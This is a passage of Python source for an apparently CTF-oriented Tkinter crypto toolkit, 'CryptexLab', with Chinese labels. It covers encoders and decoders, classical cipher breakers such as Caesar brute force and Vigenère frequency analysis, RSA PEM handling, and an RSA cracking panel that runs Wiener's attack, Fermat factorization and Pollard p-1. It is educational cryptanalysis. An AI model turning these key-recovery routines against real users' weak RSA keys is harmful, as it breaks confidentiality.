range(2, B): a = pow(a, j, n) g = math.gcd(a-1, n) if 1 &lt; g &lt; n: return g, n // g return Nonedef continued_fraction(numerator, denominator): cf = [] while denominator: a = numerator // denominator cf.append(a) numerator, denominator = denominator, numerator - a * denominator return cfdef convergents_from_cf(cf): n0, d0 = cf[0], 1 yield (n0, 1) if len(cf) == 1: return n1 = cf[1] * cf[0] + 1 d1 = cf[1] yield (n1, d1) for i in range(2, len(cf)): ni = cf[i] * n1 + n0 di = cf[i] * d1 + d0 yield (ni, di) n0, d0, n1, d1 = n1, d1, ni, didef is_perfect_square(x): if x &lt; 0: return False s = math.isqrt(x) return s * s == xdef wiener_attack(e, n): cf = continued_fraction(e, n) for k, d in convergents_from_cf(cf): if k == 0: continue if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k s = n - phi + 1 discr = s*s - 4*n if discr &gt;= 0 and is_perfect_square(discr): t = math.isqrt(discr) p = (s + t) // 2 q = (s - t) // 2 if p * q == n: return d return None# ------------------ 初始化窗口 ------------------root = tk.Tk()root.title(&quot;CryptexLab&quot;)root.geometry(&quot;800x800&quot;)font_title = (&#x27;微软雅黑&#x27;, 12, &#x27;bold&#x27;)font_text = (&#x27;微软雅黑&#x27;, 10)# ------------------ 菜单栏 ------------------menubar = tk.Menu(root)root.config(menu=menubar)# 每加一个新的页面都记得在这里更新def show_frame(frame): for f in (encode_frame, decode_frame, RailFence_frame, Caesar_frame,Vigenere_frame, rsa_generate_pem_frame, rsa_pem_frame, rsa_crack_frame, sha256_frame, md5_frame): f.pack_forget() frame.pack(fill=tk.BOTH, expand=True)# ------------------ 编码界面 ------------------def encode_input(): raw = encode_input_text.get(&#x27;1.0&#x27;, tk.END).strip() encode_output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return # 获取选中的编码方式 selected_encoding = encode_var.get() try: if selected_encoding == &#x27;Base64&#x27;: result = base64.b64encode(raw.encode()).decode() elif selected_encoding == &#x27;Base32&#x27;: result = base64.b32encode(raw.encode()).decode() elif selected_encoding == &#x27;Base58&#x27;: result = base58.b58encode(raw.encode()).decode() elif selected_encoding == &#x27;Base91&#x27;: result = base91.encode(raw.encode()) elif selected_encoding == &#x27;Binary&#x27;: result = &#x27;&#x27;.join(format(ord(c), &#x27;08b&#x27;) for c in raw) elif selected_encoding == &#x27;Hex&#x27;: result = raw.encode().hex() else: result = &quot;请选择编码方式&quot; encode_output_text.insert(tk.END, result) except Exception as e: encode_output_text.insert(tk.END, f&quot;编码失败: &#123;e&#125;&quot;)encode_frame = tk.Frame(root)# 布局tk.Label(encode_frame, text=&#x27;请输入要编码的内容：&#x27;, font=font_title).pack(pady=(10, 0))encode_input_text = scrolledtext.ScrolledText(encode_frame, height=6, font=font_text, wrap=tk.WORD)encode_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# 编码选项encode_options_frame = tk.Frame(encode_frame)tk.Label(encode_options_frame, text=&#x27;选择编码方式：&#x27;, font=font_text).pack(side=tk.LEFT, padx=(0, 10))encode_var = tk.StringVar(value=&#x27;Base64&#x27;)encode_radio_frame = tk.Frame(encode_options_frame)encode_options = [&#x27;Base64&#x27;, &#x27;Base32&#x27;, &#x27;Base58&#x27;, &#x27;Base91&#x27;, &#x27;Binary&#x27;, &#x27;Hex&#x27;]for option in encode_options: tk.Radiobutton(encode_radio_frame, text=option, variable=encode_var, value=option, font=font_text).pack(side=tk.LEFT, padx=5)encode_radio_frame.pack(side=tk.LEFT)encode_options_frame.pack(pady=10)tk.Button(encode_frame, text=&#x27;开始编码&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=encode_input).pack(pady=10)tk.Label(encode_frame, text=&#x27;编码结果：&#x27;, font=font_title).pack()encode_output_text = scrolledtext.ScrolledText(encode_frame, height=10, font=font_text, wrap=tk.WORD)encode_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 解码界面 ------------------def is_binary(s): return all(c in &#x27;01&#x27; for c in s) and len(s) % 8 == 0def decode_bytes(byte_data): try: text = byte_data.decode(&#x27;utf-8&#x27;) return text, True except UnicodeDecodeError: return byte_data.hex(), Falsedef looks_like_base64(s): return len(s) % 4 == 0 and re.fullmatch(r&#x27;[A-Za-z0-9+/=]+&#x27;, s) is not Nonedef looks_like_base32(s): return len(s) % 8 == 0 and re.fullmatch(r&#x27;[A-Z2-7=]+&#x27;, s, re.IGNORECASE) is not Nonedef looks_like_base58(s): return all(c in base58.alphabet.decode() for c in s)def looks_like_base91(s): return all(33 &lt;= ord(c) &lt;= 126 for c in s)def try_decode(s, func): decoded = func(s) return decode_bytes(decoded)def recursive_decode(s, path=None, all_paths=None, max_depth=10): if path is None: path = [] if all_paths is None: all_paths = [] if len(path) &gt;= max_depth: return all_paths decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), # (&#x27;Base91&#x27;, looks_like_base91, base91.decode), # 变为按需加入 (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i + 8], 2) for i in range(0, len(x), 8))), (&#x27;Hex&#x27;, lambda x: True, lambda x: bytes.fromhex(x)), ] # 仅当勾选“考虑Base91”时，才把 Base91 插入到与原来相同的位置（Base58 之后、Binary 之前） if &#x27;consider_base91_var&#x27; in globals() and consider_base91_var.get(): decoders.insert(3, (&#x27;Base91&#x27;, looks_like_base91, base91.decode)) for name, detector, func in decoders: if detector(s): try: text, is_utf8 = try_decode(s, func) except Exception: continue mode = &#x27;(UTF-8)&#x27; if is_utf8 else &#x27;(hex)&#x27; new_path = path + [(name, text, mode)] all_paths.append(new_path) if is_utf8: recursive_decode(text, new_path, all_paths, max_depth) return all_pathsdef select_final_path(paths): utf_paths = [p for p in paths if p[-1][2] == &#x27;(UTF-8)&#x27;] if utf_paths: max_len = max(len(p) for p in utf_paths) for p in utf_paths: if len(p) == max_len: return p max_len = max(len(p) for p in paths) for p in paths: if len(p) == max_len: return pdef decode_input(): raw = input_text.get(&#x27;1.0&#x27;, tk.END).strip().replace(&#x27; &#x27;, &#x27;&#x27;) decode_output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return paths = recursive_decode(raw) if not paths: decode_output_text.insert(tk.END, &#x27;无法识别或解码此内容。&#x27;) return final = select_final_path(paths) for i, (name, text, mode) in enumerate(final, 1): decode_output_text.insert(tk.END, f&quot;第&#123;i&#125;步 - &#123;name&#125; &#123;mode&#125;\\n结果：&#123;text&#125;\\n\\n&quot;) if len(final) == 1 and final[0][2] == &#x27;(UTF-8)&#x27;: s = final[0][1] extra_decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), # Base91 变为可选 ] if &#x27;consider_base91_var&#x27; in globals() and consider_base91_var.get(): extra_decoders.append((&#x27;Base91&#x27;, looks_like_base91, base91.decode)) # 保持 Binary 放在最后，与原逻辑一致 extra_decoders.append((&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i + 8], 2) for i in range(0, len(x), 8)))) for name, detector, func in extra_decoders: if detector(s): try: data = func(s) hex_out = data.hex() decode_output_text.insert(tk.END, f&quot;第2步 - &#123;name&#125; (hex)\\n结果：&#123;hex_out&#125;\\n&quot;) break except Exception: continue# 布局decode_frame = tk.Frame(root)tk.Label(decode_frame, text=&#x27;请输入编码内容：&#x27;, font=font_title).pack(pady=(10, 0))input_text = scrolledtext.ScrolledText(decode_frame, height=6, font=font_text, wrap=tk.WORD)input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# Base91 可选consider_base91_var = tk.BooleanVar(value=False) # 默认不勾选tk.Checkbutton(decode_frame, text=&#x27;考虑Base91&#x27;, variable=consider_base91_var, font=font_text).pack(anchor=&#x27;w&#x27;, padx=20)tk.Button(decode_frame, text=&#x27;开始解码&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=decode_input).pack(pady=10)tk.Label(decode_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()decode_output_text = scrolledtext.ScrolledText(decode_frame, height=10, font=font_text, wrap=tk.WORD)decode_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 凯撒解密界面 ------------------def caesar_decrypt(text, shift): result = &#x27;&#x27; for ch in text: if &#x27;A&#x27; &lt;= ch &lt;= &#x27;Z&#x27;: result += chr((ord(ch)-ord(&#x27;A&#x27;)-shift)%26+ord(&#x27;A&#x27;)) elif &#x27;a&#x27; &lt;= ch &lt;= &#x27;z&#x27;: result += chr((ord(ch)-ord(&#x27;a&#x27;)-shift)%26+ord(&#x27;a&#x27;)) else: result += ch return resultdef decrypt_caesar(): text = caesar_input.get(&#x27;1.0&#x27;, tk.END).strip() caesar_output_text.delete(&#x27;1.0&#x27;, tk.END) keyword = keyword_entry.get().strip() if var_traverse.get(): for k in range(26): dec = caesar_decrypt(text, k) if not keyword or keyword.lower() in dec.lower(): caesar_output_text.insert(tk.END, f&quot;Key=&#123;k&#125;:\\n&#123;dec&#125;\\n\\n&quot;) else: try: k = int(key_entry.get()) dec = caesar_decrypt(text, k) caesar_output_text.insert(tk.END, dec) except ValueError: caesar_output_text.insert(tk.END, &quot;密钥应为整数。&quot;)Caesar_frame = tk.Frame(root)# 布局tk.Label(Caesar_frame, text=&#x27;凯撒密文输入：&#x27;, font=font_title).pack(pady=(10,0))caesar_input = scrolledtext.ScrolledText(Caesar_frame, height=5, font=font_text)caesar_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)key_row = tk.Frame(Caesar_frame)tk.Label(key_row, text=&#x27;密钥 (0-25):&#x27;, font=font_text).pack(side=tk.LEFT)key_entry = tk.Entry(key_row, width=5)key_entry.pack(side=tk.LEFT, padx=(5,15))tk.Label(key_row, text=&#x27;关键词 (可选):&#x27;, font=font_text).pack(side=tk.LEFT)keyword_entry = tk.Entry(key_row, width=20)keyword_entry.pack(side=tk.LEFT, padx=5)key_row.pack(pady=10)var_traverse = tk.BooleanVar(value=True)tk.Checkbutton(Caesar_frame, text=&#x27;遍历所有可能&#x27;, variable=var_traverse).pack()tk.Button(Caesar_frame, text=&#x27;开始解密&#x27;, font=font_title, bg=&#x27;#2196F3&#x27;, fg=&#x27;white&#x27;, command=decrypt_caesar).pack(pady=10, fill=&#x27;x&#x27;, padx=20)tk.Label(Caesar_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()caesar_output_text = scrolledtext.ScrolledText(Caesar_frame, height=10, font=font_text)caesar_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 栅栏密码界面 ------------------def rail_fence_encrypt(text, rails): if rails &lt;= 1 or not text: return text rows = [&#x27;&#x27;] * rails r, step = 0, 1 for ch in text: rows[r] += ch if r == 0: step = 1 elif r == rails - 1: step = -1 r += step return &#x27;&#x27;.join(rows)def rail_fence_decrypt(cipher, rails): if rails &lt;= 1 or not cipher: return cipher n = len(cipher) # 先跑一遍得到每个位置所在“栏”的序列 pattern = [] r, step = 0, 1 for _ in range(n): pattern.append(r) if r == 0: step = 1 elif r == rails - 1: step = -1 r += step # 统计每一栏有多少字符 counts = [pattern.count(i) for i in range(rails)] # 按栏把密文切片回填 idx = 0 rows = [] for c in counts: rows.append(list(cipher[idx: idx + c])) idx += c # 再按 pattern 顺序重建明文 pos_in_row = [0] * rails res = [] for row_id in pattern: res.append(rows[row_id][pos_in_row[row_id]]) pos_in_row[row_id] += 1 return &#x27;&#x27;.join(res)def rf_do(op): rf_output_text.delete(&#x27;1.0&#x27;, tk.END) text = rf_input.get(&#x27;1.0&#x27;, tk.END).strip() rails_str = rf_key_entry.get().strip() if not text: rf_output_text.insert(tk.END, &quot;请输入文本。&quot;) return try: rails = int(rails_str) if rails &lt; 2: raise ValueError except ValueError: rf_output_text.insert(tk.END, &quot;栏数应为整数且 ≥ 2。&quot;) return if op == &#x27;enc&#x27;: out = rail_fence_encrypt(text, rails) else: out = rail_fence_decrypt(text, rails) rf_output_text.insert(tk.END, out)RailFence_frame = tk.Frame(root)# 布局tk.Label(RailFence_frame, text=&#x27;栅栏密码 - 输入：&#x27;, font=font_title).pack(pady=(10,0))rf_input = scrolledtext.ScrolledText(RailFence_frame, height=6, font=font_text, wrap=tk.WORD)rf_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)rf_mid = tk.Frame(RailFence_frame)tk.Label(rf_mid, text=&#x27;密钥：&#x27;, font=font_text).pack(side=tk.LEFT)rf_key_entry = tk.Entry(rf_mid, width=10)rf_key_entry.insert(0, &#x27;3&#x27;) # 默认 3 栏rf_key_entry.pack(side=tk.LEFT, padx=(5,15))op_var = tk.StringVar(value=&#x27;enc&#x27;)# tk.Label(rf_mid, text=&#x27;操作：&#x27;, font=font_text).pack(side=tk.LEFT, padx=(10,0))tk.Radiobutton(rf_mid, text=&#x27;加密&#x27;, variable=op_var, value=&#x27;enc&#x27;).pack(side=tk.LEFT)tk.Radiobutton(rf_mid, text=&#x27;解密&#x27;, variable=op_var, value=&#x27;dec&#x27;).pack(side=tk.LEFT)rf_mid.pack(pady=8)btn_row = tk.Frame(RailFence_frame)tk.Button(btn_row, text=&#x27;加解密&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=lambda: rf_do(op_var.get())).pack(side=tk.LEFT, padx=8)btn_row.pack(pady=6)tk.Label(RailFence_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()rf_output_text = scrolledtext.ScrolledText(RailFence_frame, height=10, font=font_text, wrap=tk.WORD)rf_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ 维吉尼亚解密界面 ------------------# 词频分析# 英文字母频率（归一化）ENG_FREQ_RAW = &#123; &#x27;A&#x27;: 8.167, &#x27;B&#x27;: 1.492, &#x27;C&#x27;: 2.782, &#x27;D&#x27;: 4.253, &#x27;E&#x27;:12.702, &#x27;F&#x27;: 2.228, &#x27;G&#x27;: 2.015, &#x27;H&#x27;: 6.094, &#x27;I&#x27;: 6.966, &#x27;J&#x27;: 0.153, &#x27;K&#x27;: 0.772, &#x27;L&#x27;: 4.025, &#x27;M&#x27;: 2.406, &#x27;N&#x27;: 6.749, &#x27;O&#x27;: 7.507, &#x27;P&#x27;: 1.929, &#x27;Q&#x27;: 0.095, &#x27;R&#x27;: 5.987, &#x27;S&#x27;: 6.327, &#x27;T&#x27;: 9.056, &#x27;U&#x27;: 2.758, &#x27;V&#x27;: 0.978, &#x27;W&#x27;: 2.360, &#x27;X&#x27;: 0.150, &#x27;Y&#x27;: 1.974, &#x27;Z&#x27;: 0.074,&#125;ENG_FREQ = &#123;k: v / sum(ENG_FREQ_RAW.values()) for k, v in ENG_FREQ_RAW.items()&#125;ALPHABET = string.ascii_uppercase# 工具函数def index_of_coincidence(text): N = len(text) if N &lt; 2: return 0.0 freq = Counter(text) return sum(n * (n - 1) for n in freq.values()) / (N * (N - 1))def avg_ic_for_len(cipher, k): return sum(index_of_coincidence(cipher[i::k]) for i in range(k)) / kdef chi_square_list(col): N = len(col) observed = Counter(col) result = [] for shift in range(26): chi = 0.0 for i, c in enumerate(ALPHABET): expected = ENG_FREQ[c] * N shifted = ALPHABET[(i + shift) % 26] observed_count = observed.get(shifted, 0) chi += ((observed_count - expected) ** 2) / expected result.append(chi) return resultdef kasiski_candidates(cipher, n_min=3, n_max=6, key_lo=10, key_hi=50, top_n=8): positions = defaultdict(list) for n in range(n_min, n_max + 1): for i in range(len(cipher) - n + 1): gram = cipher[i:i+n] positions[gram].append(i) votes = &#123;&#125; for locs in positions.values(): if len(locs) &lt; 2: continue for i in range(len(locs)): for j in range(i + 1, len(locs)): dist = locs[j] - locs[i] for k in range(key_lo, key_hi + 1): if dist % k == 0: votes[k] = votes.get(k, 0) + 1 return sorted(votes, key=votes.get, reverse=True)[:top_n]def recover_key(cipher, key_lo=10, key_hi=50, kasiski_top=8, ic_top=3): cipher = &#x27;&#x27;.join(filter(str.isalpha, cipher.upper())) candidates = kasiski_candidates(cipher, key_lo=key_lo, key_hi=key_hi, top_n=kasiski_top) if not candidates: candidates = list(range(key_lo, key_hi + 1)) ic_scores = &#123;k: avg_ic_for_len(cipher, k) for k in candidates&#125; top_lengths = sorted(ic_scores, key=ic_scores.get, reverse=True)[:ic_top] best_key = None best_score = float(&#x27;inf&#x27;) for k in top_lengths: key = [] total_chi = 0.0 for i in range(k): col = cipher[i::k] chis = chi_square_list(col) best_shift = chis.index(min(chis)) key.append(ALPHABET[best_shift]) total_chi += chis[best_shift] if total_chi &lt; best_score: best_key = &#x27;&#x27;.join(key) best_score = total_chi return best_key, best_score#普通def vigenere_decrypt(cipher, key): vigenere_result = &#x27;&#x27; klen = len(key) j = 0 # 用于密钥索引，只对字母递增 for c in cipher: if c.isalpha(): k = key[j % klen] ki = ord(k.upper()) - ord(&#x27;A&#x27;) # 统一处理大小写密钥 if c.isupper(): vigenere_result += chr((ord(c) - ord(&#x27;A&#x27;) - ki) % 26 + ord(&#x27;A&#x27;)) else: vigenere_result += chr((ord(c) - ord(&#x27;a&#x27;) - ki) % 26 + ord(&#x27;a&#x27;)) j += 1 else: vigenere_result += c # 非字母直接加 return vigenere_resultdef decrypt_vigenere(): text = vigenere_input.get(&#x27;1.0&#x27;, tk.END).strip() key = vigenere_key_entry.get().strip() vigenere_output_text.delete(&#x27;1.0&#x27;, tk.END) if not text: vigenere_output_text.insert(tk.END, &quot;请输入密文。&quot;) return # 如果没有密钥，就使用频率分析恢复 if not key: key, score = recover_key(text) vigenere_output_text.insert(tk.END, f&quot;[自动识别密钥]：&#123;key&#125; (χ²得分=&#123;score:.2f&#125;)\\n\\n&quot;) result = vigenere_decrypt(text, key) vigenere_output_text.insert(tk.END, result)Vigenere_frame = tk.Frame(root)# 布局tk.Label(Vigenere_frame, text=&#x27;维吉尼亚密文输入：&#x27;, font=font_title).pack(pady=(10,0))vigenere_input = scrolledtext.ScrolledText(Vigenere_frame, height=5, font=font_text)vigenere_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)key_row = tk.Frame(Vigenere_frame)tk.Label(key_row, text=&#x27;密钥：&#x27;, font=font_text).pack(side=tk.LEFT)vigenere_key_entry = tk.Entry(key_row, width=20)vigenere_key_entry.pack(side=tk.LEFT, padx=5)key_row.pack(pady=10)tk.Label(Vigenere_frame, text=&#x27;（如果没有密钥则默认进行词频分析）&#x27;, font=font_text, fg=&#x27;gray&#x27;).pack()tk.Button(Vigenere_frame, text=&#x27;开始解密&#x27;, font=font_title, bg=&#x27;#009688&#x27;, fg=&#x27;white&#x27;, command=decrypt_vigenere).pack(pady=10, fill=&#x27;x&#x27;, padx=20)tk.Label(Vigenere_frame, text=&#x27;输出结果：&#x27;, font=font_title).pack()vigenere_output_text = scrolledtext.ScrolledText(Vigenere_frame, height=10, font=font_text)vigenere_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ RSA - 生成PEM界面 ------------------def generate_pem(): rsa_generate_pem_output.delete(&#x27;1.0&#x27;, tk.END) def get_int(name): txt = rsa_generate_entries[name].get().strip().replace(&quot; &quot;, &quot;&quot;) return int(txt) if txt else None p = get_int(&#x27;p&#x27;) q = get_int(&#x27;q&#x27;) e = get_int(&#x27;e&#x27;) if None in (p, q, e): rsa_generate_pem_output.insert(tk.END, &quot;请填写所有必需参数：p, q, e\\n&quot;) return try: # 计算其他参数 n = p * q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) # 生成私钥 from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.hazmat.primitives import serialization private_key = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=d % (p-1), dmq1=d % (q-1), iqmp=pow(q, -1, p), public_numbers=rsa.RSAPublicNumbers(e=e, n=n) ).private_key(backend=default_backend()) # 生成公钥 public_key = private_key.public_key() # 输出PEM格式 private_pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption() ).decode() public_pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ).decode() rsa_generate_pem_output.insert(tk.END, &quot;=== RSA 私钥 (PEM格式) ===\\n\\n&quot;, &quot;bold&quot;) rsa_generate_pem_output.insert(tk.END, private_pem) rsa_generate_pem_output.insert(tk.END, &quot;\\n\\n=== RSA 公钥 (PEM格式) ===\\n\\n&quot;, &quot;bold&quot;) rsa_generate_pem_output.insert(tk.END, public_pem) rsa_generate_pem_output.insert(tk.END, &quot;\\n\\n=== 参数信息 ===\\n&quot;, &quot;bold&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;n = &#123;n&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;e = &#123;e&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;d = &#123;d&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;p = &#123;p&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;q = &#123;q&#125;\\n&quot;) except Exception as e: rsa_generate_pem_output.insert(tk.END, f&quot;生成失败: &#123;e&#125;\\n&quot;)rsa_generate_pem_frame = tk.Frame(root)# 布局tk.Label(rsa_generate_pem_frame, text=&#x27;请输入 RSA 参数（十进制整数）：&#x27;, font=font_title).pack(pady=(10,5))rsa_generate_entries = &#123;&#125;for label in [&#x27;p&#x27;,&#x27;q&#x27;,&#x27;e&#x27;]: row = tk.Frame(rsa_generate_pem_frame) tk.Label(row, text=f&quot;&#123;label&#125; =&quot;, font=font_text, width=3).pack(side=tk.LEFT) entry = tk.Entry(row, font=font_text, width=40) entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5) rsa_generate_entries[label] = entry row.pack(padx=20, pady=3, fill=tk.X)# 生成按钮tk.Button(rsa_generate_pem_frame, text=&#x27;生成PEM&#x27;, font=font_title, bg=&#x27;#9C27B0&#x27;, fg=&#x27;white&#x27;, command=generate_pem).pack(pady=10)tk.Label(rsa_generate_pem_frame, text=&#x27;生成的PEM：&#x27;, font=font_title).pack()rsa_generate_pem_output = scrolledtext.ScrolledText(rsa_generate_pem_frame, height=15, font=font_text)rsa_generate_pem_output.tag_configure(&quot;bold&quot;, font=(&#x27;微软雅黑&#x27;, 10, &#x27;bold&#x27;))rsa_generate_pem_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ RSA - PEM解析界面 ------------------def parse_pem(): global parsed_pem_values # 添加全局变量存储 parsed_pem_values = &#123;&#125; # 初始化字典 rsa_pem_output.delete(&#x27;1.0&#x27;, tk.END) pem_data = pem_input.get(&#x27;1.0&#x27;, tk.END).strip().encode() try: if b&#x27;BEGIN PUBLIC KEY&#x27; in pem_data: pub_key = serialization.load_pem_public_key(pem_data, backend=default_backend()) nums = pub_key.public_numbers() rsa_pem_output.insert(tk.END, f&quot;类型：公钥\\nn=&#123;nums.n&#125;\\ne=&#123;nums.e&#125;\\n&quot;) parsed_pem_values = &#123;&#x27;n&#x27;: nums.n, &#x27;e&#x27;: nums.e&#125; else: priv_key = serialization.load_pem_private_key(pem_data, password=None, backend=default_backend()) nums = priv_key.private_numbers() rsa_pem_output.insert(tk.END, f&quot;类型：私钥\\nn=&#123;nums.public_numbers.n&#125;\\ne=&#123;nums.public_numbers.e&#125;\\nd=&#123;nums.d&#125;\\np=&#123;nums.p&#125;\\nq=&#123;nums.q&#125;\\n&quot;) parsed_pem_values = &#123; &#x27;n&#x27;: nums.public_numbers.n, &#x27;e&#x27;: nums.public_numbers.e, &#x27;d&#x27;: nums.d, &#x27;p&#x27;: nums.p, &#x27;q&#x27;: nums.q &#125; except Exception as e: rsa_pem_output.insert(tk.END, f&quot;解析失败: &#123;e&#125;&quot;) def transfer_to_rsa_crack(): # 首先切换到RSA破解界面 show_frame(rsa_crack_frame) # 把保存的parsed_pem_values赋值到rsa_crack_frame对应输入框 for key, entry in rsa_entries.items(): if key in parsed_pem_values: entry.delete(0, tk.END) entry.insert(0, str(parsed_pem_values[key]))rsa_pem_frame = tk.Frame(root)# 布局tk.Label(rsa_pem_frame, text=&#x27;请输入 PEM 格式的密钥：&#x27;, font=font_title).pack(pady=(10,0))pem_input = scrolledtext.ScrolledText(rsa_pem_frame, height=10, font=font_text)pem_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(rsa_pem_frame, text=&#x27;解析 PEM&#x27;, font=font_title, bg=&#x27;#9C27B0&#x27;, fg=&#x27;white&#x27;, command=parse_pem).pack(pady=10)tk.Label(rsa_pem_frame, text=&#x27;解析结果：&#x27;, font=font_title).pack()rsa_pem_output = scrolledtext.ScrolledText(rsa_pem_frame, height=10, font=font_text)rsa_pem_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(rsa_pem_frame, text=&#x27;传递到RSA破解&#x27;, font=font_title, bg=&#x27;#FF9800&#x27;, fg=&#x27;white&#x27;, command=lambda: transfer_to_rsa_crack()).pack(pady=10)# ------------------ RSA - 破解界面 ------------------def reset_rsa_entries(): &quot;&quot;&quot;重置所有RSA参数输入框&quot;&quot;&quot; for entry in rsa_entries.values(): entry.delete(0, tk.END) # 重置攻击选项的复选框 for var, _ in attack_vars.values(): var.set(False) # 重置循环上限输入框 for _, param_entry in attack_vars.values(): param_entry.delete(0, tk.END) param_entry.insert(0, &#x27;1000000&#x27;) # 清空输出结果 rsa_crack_output.delete(&#x27;1.0&#x27;, tk.END)def rsa_crack_handler(): rsa_crack_output.delete(&#x27;1.0&#x27;, tk.END) def get_int(name): txt = rsa_entries[name].get().strip().replace(&quot; &quot;, &quot;&quot;) return int(txt) if txt else None n = get_int(&#x27;n&#x27;) p = get_int(&#x27;p&#x27;) q = get_int(&#x27;q&#x27;) d = get_int(&#x27;d&#x27;) e = get_int(&#x27;e&#x27;) c = get_int(&#x27;c&#x27;) # 1. 全部参数 if None not in (n,d,c): m = pow(c, d, n) try: text = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except: text = str(long_to_bytes(m)) rsa_crack_output.insert(tk.END, f&quot;解密结果: &#123;text&#125;\\n&quot;) return # 2. 计算 d（只要给了 p, q, e 就能算；n 缺了就用 p*q） if None not in (p, q, e): n_calc = n if n is not None else p * q phi = (p - 1) * (q - 1) d_calc = pow(e, -1, phi) rsa_crack_output.insert(tk.END, f&quot;计算出的 d: &#123;d_calc&#125;\\n&quot;) # 若给了密文 c，自动解密并打印明文 if c is not None: m = pow(c, d_calc, n_calc) try: text = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except Exception: text = str(long_to_bytes(m)) rsa_crack_output.insert(tk.END, f&quot;解密结果: &#123;text&#125;\\n&quot;) return # 3. 攻击 if n is not None: attack_executed = False if None not in (n,e): if attack_vars[&quot;Wiener&#x27;s Attack&quot;][0].get(): rsa_crack_output.insert(tk.END, &quot;执行 Wiener 攻击...\\n&quot;) d_w = wiener_attack(e,n) if d_w: rsa_crack_output.insert(tk.END, f&quot;成功: d=&#123;d_w&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;失败。\\n&quot;) attack_executed = True if attack_vars[&#x27;Fermat Factorization&#x27;][0].get(): lim = int(attack_vars[&#x27;Fermat Factorization&#x27;][1].get()) rsa_crack_output.insert(tk.END, &quot;执行 Fermat 分解...\\n&quot;) res = fermat_factor(n, lim) if res: rsa_crack_output.insert(tk.END, f&quot;成功: p=&#123;res[0]&#125;, q=&#123;res[1]&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;失败。\\n&quot;) attack_executed = True if attack_vars[&quot;Pollard&#x27;s p-1&quot;][0].get(): B = int(attack_vars[&quot;Pollard&#x27;s p-1&quot;][1].get()) rsa_crack_output.insert(tk.END, &quot;执行 Pollard p-1...\\n&quot;) res = pollard_p1(n, B) if res: rsa_crack_output.insert(tk.END, f&quot;成功: p=&#123;res[0]&#125;, q=&#123;res[1]&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;失败。\\n&quot;) attack_executed = True if not attack_executed: rsa_crack_output.insert(tk.END, &quot;请选择至少一种攻击方法。\\n&quot;) return rsa_crack_output.insert(tk.END, &quot;请至少输入 n 或更多参数。\\n&quot;) rsa_crack_frame = tk.Frame(root)# 布局tk.Label(rsa_crack_frame, text=&#x27;请输入 RSA 参数（十进制整数）：&#x27;, font=font_title).pack(pady=(10,5))rsa_entries = &#123;&#125;for label in [&#x27;n&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;c&#x27;]: row = tk.Frame(rsa_crack_frame) tk.Label(row, text=f&quot;&#123;label&#125; =&quot;, font=font_text, width=3).pack(side=tk.LEFT) entry = tk.Entry(row, font=font_text, width=40) entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5) rsa_entries[label] = entry row.pack(padx=20, pady=3, fill=tk.X)# 攻击选项attack_vars = &#123;&#125;for name in [&#x27;Fermat Factorization&#x27;,&quot;Pollard&#x27;s p-1&quot;,&quot;Wiener&#x27;s Attack&quot;]: row = tk.Frame(rsa_crack_frame) var_enable = tk.BooleanVar(value=False) tk.Checkbutton(row, text=name, variable=var_enable, font=font_text).pack(side=tk.LEFT) tk.Label(row, text=&#x27;循环上限:&#x27;, font=font_text).pack(side=tk.LEFT, padx=5) param_entry = tk.Entry(row, width=10) param_entry.insert(0,&#x27;1000000&#x27;) param_entry.pack(side=tk.LEFT) attack_vars[name] = (var_enable,param_entry) 